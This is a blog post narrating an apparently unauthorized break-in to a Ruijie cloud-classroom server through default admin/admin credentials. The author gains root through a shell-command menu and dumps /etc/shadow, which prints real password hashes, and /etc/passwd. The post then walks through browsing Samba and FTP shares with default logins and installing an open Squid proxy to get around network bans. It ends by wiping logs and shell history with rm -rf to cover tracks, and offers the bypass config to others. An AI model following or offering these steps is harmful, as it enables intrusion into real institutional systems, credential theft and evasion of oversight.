title: 弱口令入侵锐捷云课堂 R3000SV2[EN]
tags:
  - Tech
categories: []
date: 2016-06-04 13:56:00
---

Contents:
1. Prepare about Rain200S Client and Server
2. Lucky!Scanned Easily!
3. Discover SSH & Samba & FTP
4. Exploit & Install Squid to cross the ban

- - - - - - -

# Prepare

Software Needed : putty , nmap
Hardware Needed : joyful heart , your eyes . your hands
Rain200S Client Android Debug Entrance : Alt+Shift+F7

Rain200S is running Android 4.4.2 Built in AOSP , All Apks and install scripts is hosted on my vps.

- - - - - - -

# Lucky!Scanned Easily!

See your RCC Client Config:
- - - - - - -
## Your will discover : 

  * Server IP Address : $HIDDEN-SERVER_IP
  * Normally Admin Password for Client Software : ruijie.com
  * Main Port Opened on the Server : 80(httpd , using Apache Tomcat), 22(SSH) ,21(Running vsftpd)
  * Main Protocol Running : KVM on QEMU , PXE Network Boot
  * 7-zip V9.20 installed on C:\Program Files\RCC-ClassManager\7-Zip\

 Luckily, I scanned weak password of login page on 80 port , Password Get!

   * User : Admin
   * Password : admin
- - - - - - -

# Discover SSH & Samba & FTP


 Using Putty to connect server via SSH

 Admin & admin connected successfully!
 
## Oh! Fuck , A Quiet Terminal Response!
- - - - - - -
No , Not a Problem!
Input as it noticed "41.exec_shell_command"
- - - - - - 

|-------------------------COMMAND---------------------------------------
<1>:cvm_version        <2>:cvm_monitor     <3>:ifconfig_list    <4>:list_all
<5>:get_sn             <6>:get_status      <7>:list_base        <8>:list_iso
<9>:list_temp          <10>:list_vms <11>:web_service_status<12>:list_instance
<13>:list_instance_name     <14>:run_instance_fast     <15>:release_instance
<16>:edit_image        <17>:edit_temp      <18>:ifconfig        <19>:dnsconfig
<20>:open_port         <21>:close_port     <22>:change_ftpuser_pwd
<23>:reset_ftpuser_pwd <24>:clone_image    <25>:create_base     <26>:del_base
<27>:del_iso           <28>:get_check    <29>:list_resource<30>:preload_image
<31>:rebase_image      <32>:rename_image <33>:list-preload    <34>:del_preload
<35>:del_image         <36>:del_temp     <37>:list_image      <38>:replace_iso
<39>:web_service       <40>:shutdown_instance         <41>:exec_shell_cmd
<42>:expand_image      <43>:copy_temp                 <44>:list_backup_temp
<45>:list_backup_temp_dir   <46>:del_backup_temp   <47>:del_backup_temp_dir
<48>:poweroff          <49>:reboot        <50>:add_vlan        <51>:del_vlan
<52>:list_vlan         <53>:quit          <0>:factory test
|-------------------------------------------------------------------------------

    41
    please input agrs
    ls
    ls ~
    <args><cmd>ls ~</cmd></args>
    exec_shell_cmd result:
    <?xml version="1.0" encoding="UTF-8"?>
    <return>
      <command>exec_shell_cmd</command>
      <output>anaconda-ks.cfg
    install.log
    install.log.syslog
    iptables.save
    ks-post1.log
    ks-post.log
    </output>
    </return>

please choose the command (input a number between 0-53):

- - - - - - 
    > whoami
    # root
    > cat /etc/shadow
    # root:$1$ib1ReZOT$/kwEfqJdhMIU/GF7HUJjs/:16665:0:99999:7::: 
    # bin:*:15980:0:99999:7::: 
    # daemon:*:15980:0:99999:7::: 
    # adm:*:15980:0:99999:7::: 
    # lp:*:15980:0:99999:7::: 
    # sync:*:15980:0:99999:7::: 
    # shutdown:*:15980:0:99999:7::: 
    # halt:*:15980:0:99999:7::: 
    # mail:*:15980:0:99999:7::: 
    # uucp:*:15980:0:99999:7::: 
    # operator:*:15980:0:99999:7::: 
    # games:*:15980:0:99999:7::: 
    # gopher:*:15980:0:99999:7::: 
    # ftp:*:15980:0:99999:7::: 
    # nobody:*:15980:0:99999:7::: 
    # vcsa:!!:16665:::::: 
    # saslauth:!!:16665:::::: 
    # postfix:!!:16665:::::: 
    # sshd:!!:16665:::::: 
    # dbus:!!:16665:::::: 
    # haldaemon:!!:16665:::::: 
    # qemu:!!:16665:::::: 
    # rpcuser:!!:16665:::::: 
    # nfsnobody:!!:16665:::::: 
    # radvd:!!:16665:::::: 
    # rpc:!!:16665:0:99999:7::: 
    # user:$6$dAbB4GRO$Me2XdFm0iXtn7T2bnM13EiRj0Ml.SrAq.Xmq5Wfmo8v8bxlfHBaz2b8jqzVgQLs57GjgQSHoHSLmPxsj5SUX//:16665:0:99999:7:::
    # pxeuser:$6$FOcL7ovA$B5.Mb0twCHpOkYLlLeo5YlO3JDNG9HjA22GvSvCJA4X7lxplVMAmUHpX7uSZno.fHy/8hjZm8wPciiZUS8ofo0:16665:0:99999:7:::
    # admin:$6$1rr7BCWK$z7ImwxlxPGPUFeLqOGOt4xrQvQjum7Lse0oOUav0HsBJ33uAe0A66OLWKqKd9h6N2y/K5sxJZ/geTeY8cFNfm1:16665:0:99999:7:::
    # lessons:$6$b6M8xaml$yVuLM8L1QhJH1cTMIRta3ySx645tx.fpOkRkTXGrjREB5pX7BljnPt6BdAhaxs/mCetloCXjLh2iUbAVbQvfg0:16665:0:99999:7:::
    # share:$6$Rexp1nDA$qbddPOOnWLhlhSRB9mh0zVOumKG/ZyAOYep.p7I3qefyeSKRAQbbvN7XA3nOE2gQd/F4jCc6cu2yEqJSAPK1Z0:16665:0:99999:7:::
    # upgrade:$6$3f0Mb485$2uLmNL0M7eEc6aRYQznhsedcr/JcwDY90gTtGmyKR.RAI.8n1hNPHluJ78X4xuv2myJP9LGtXcaPhvU9gvLNP.:16665:0:99999:7:::
    # postgres:!!:16665:::::: 
    # tomcat:!!:16665:::::: 
    # teacher:$6$2KKOchqB$lj4FlSqDWLQL.K0UqrxFHLxt6JrMen3Ig2hfQjZqG5F3KctWpd9u8XXEBdjyPhn88Fj0bNdLA.L0w8fq6fKOW/:16665:0:99999:7:::
    # dhcpd:!!:16665:::::: 
    # ntp:!!:16665:::::: 
    # mysql:!!:16665:::::: 
    # apache:!!:16665:::::: 
- - - - - - -   


## ** Password Hashed Got ! **


- - - - - - -
    > cat /etc/passwd
    # root:x:0:0:root:/root:/bin/bash 
    # bin:x:1:1:bin:/bin:/sbin/nologin 
    # daemon:x:2:2:daemon:/sbin:/sbin/nologin 
    # adm:x:3:4:adm:/var/adm:/sbin/nologin 
    # lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
    # sync:x:5:0:sync:/sbin:/bin/sync 
    # shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
    # halt:x:7:0:halt:/sbin:/sbin/halt 
    # mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 
    # uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin 
    # operator:x:11:0:operator:/root:/sbin/nologin 
    # games:x:12:100:games:/usr/games:/sbin/nologin 
    # gopher:x:13:30:gopher:/var/gopher:/sbin/nologin 
    # ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 
    # nobody:x:99:99:Nobody:/:/sbin/nologin 
    # vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin 
    # saslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologin 
    # postfix:x:89:89::/var/spool/postfix:/sbin/nologin 
    # sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 
    # dbus:x:81:81:System message bus:/:/sbin/nologin 
    # haldaemon:x:68:68:HAL daemon:/:/sbin/nologin 
    # qemu:x:107:107:qemu user:/:/sbin/nologin 
    # rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin 
    # nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin 
    # radvd:x:75:75:radvd user:/:/sbin/nologin 
    # rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin 
    # user:x:500:500::/home/user:/bin/bash 
    # pxeuser:x:501:501::/home/pxeuser:/bin/bash 
    # admin:x:502:0::/home/admin:/home/admin/login.sh 
    # lessons:x:503:503::/opt/ftpshare/lessons:/sbin/nologin 
    # share:x:504:504::/opt/ftpshare/share:/sbin/nologin 
    # upgrade:x:505:505::/opt/ftpshare/upgrade:/sbin/nologin 
    # postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash 
    # tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat6:/sbin/nologin 
    # teacher:x:506:506::/home/teacher:/bin/bash 
    # dhcpd:x:177:177:DHCP server:/:/sbin/nologin 
    # ntp:x:38:38::/etc/ntp:/sbin/nologin 
    # mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash 
    # apache:x:48:48:Apache:/var/www:/sbin/nologin 
- - - - - - -    


## ** Login Shell got ! **


- - - - - - -
 Using '\\$HIDDEN-SERVER_IP' to Discover Samba On WindowsXP
- - - - - - -
    \\$HIDDEN-SERVER_IP
- - - - - - -
pxeuser?admin?share?
Wow!
The "/pxeuser" share includes all the clients login logs.
The "/admin" share includes all the tools that Ruijie Official made.
The "/share" share is the origin of the Disk D of the Clients.
- - - - - - -
Upload Chrome and Putty to /share.
Done!

 Using 'ftp://user:password@IP:port/' to find what is in FTP
- - - - - - -
ftp://share:share@$HIDDEN-SERVER_IP:21/
ftp://lessons:lessons@$HIDDEN-SERVER_IP:21/
- - - - - - -
The content of the "share" folder is the same as the overhead listed.
The content of the "lessons" folder is the KVM System Image of Client to boot with PXE Network Protocol.

Also , When I try to input a wrong password , it noticed me '220 Vsftpd v2.2" .
HAHAHAHA !

# Exploit & Install Squid to cross the ban

Find the System Info and Change Password to get the root Permission

    [root@RCD ~]# lsb_release
    LSB Version:    :base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch
    [root@RCD ~]# uname -a
    Linux RCD 3.10.67.4-rj_R1 #1 SMP Thu May 28 14:41:55 CST 2015 x86_64 x86_64 x86_64 GNU/Linux
    [root@RCD ~]# iptables-restore < ./iptables.save
    [root@RCD ~]# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     udp  --  anywhere             anywhere            udp dpt:domain
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:domain
ACCEPT     udp  --  anywhere             anywhere            udp dpt:bootps
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:bootps
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:squid
ACCEPT     udp  --  anywhere             anywhere            udp dpt:ndl-aas

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere            ctstate RELATED,ESTABLISHED
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
    [root@RCD ~]#
    
    yum update -y && yum install squid -y
    chkconfig squid on

## Change squid.conf to allow 80 port connection


    [root@RCD ~]# cat /etc/squid/squid.conf
    #
    # Recommended minimum configuration:
    #
    acl manager proto cache_object
    acl localhost src 127.0.0.1/32 ::1
    acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
    
    # Example rule allowing access from your local networks.
    # Adapt to list your (internal) IP networks from where browsing
    # should be allowed
    acl localnet src 10.0.0.0/8     # RFC1918 possible internal network
    acl localnet src 172.16.0.0/12  # RFC1918 possible internal network
    acl localnet src 192.168.0.0/16 # RFC1918 possible internal network
    acl localnet src fc00::/7       # RFC 4193 local private network range
    acl localnet src fe80::/10      # RFC 4291 link-local (directly plugged) machines
    
    acl SSL_ports port 443
    acl Safe_ports port 80          # http
    acl Safe_ports port 21          # ftp
    acl Safe_ports port 443         # https
    acl Safe_ports port 70          # gopher
    acl Safe_ports port 210         # wais
    acl Safe_ports port 1025-65535  # unregistered ports
    acl Safe_ports port 280         # http-mgmt
    acl Safe_ports port 488         # gss-http
    acl Safe_ports port 591         # filemaker
    acl Safe_ports port 777         # multiling http
    acl CONNECT method CONNECT
    
    #
    # Recommended minimum Access Permission configuration:
    #
    # Only allow cachemgr access from localhost
    http_access allow manager localhost
    http_access allow manager
    
    # Deny requests to certain unsafe ports
    http_access allow !Safe_ports
    
    # Deny CONNECT to other than secure SSL ports
    http_access allow CONNECT !SSL_ports
    
    # We strongly recommend the following be uncommented to protect innocent
    # web applications running on the proxy server who think the only
    # one who can access services on "localhost" is a local user
    #http_access deny to_localhost
    
    #
    # INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS
    #
    
    # Example rule allowing access from your local networks.
    # Adapt localnet in the ACL section to list your (internal) IP networks
    # from where browsing should be allowed
    http_access allow localnet
    http_access allow localhost

    # And finally deny all other access to this proxy
    http_access allow all
    
    # Squid normally listens to port $HIDDEN_PORT
    http_port $HIDDEN_PORT

    # Uncomment and adjust the following to add a disk cache directory.
    #cache_dir ufs /var/spool/squid 100 16 256
    
    # Leave coredumps in the first cache dir
    coredump_dir /var/spool/squid
    
    # Add any of your own refresh_pattern entries above these.
    refresh_pattern ^ftp:           1440    20%     10080
    refresh_pattern ^gopher:        1440    0%      1440
    refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
    refresh_pattern .               0       20%     4320
    
> I change the port which squid is listened to , because it can only be connected in our local network.

# Last Step!Clear Logs!

    Login as root
    rm -rf /var/log/*
    rm -rf ~/.bash_history
    
# Done! And Revealation!

> Donnot set a weak password or running a unset iptables!

- - - - - - -

Thanks!
If anyone who wants to cross the ban , please contact me via email to get the config.Thanks!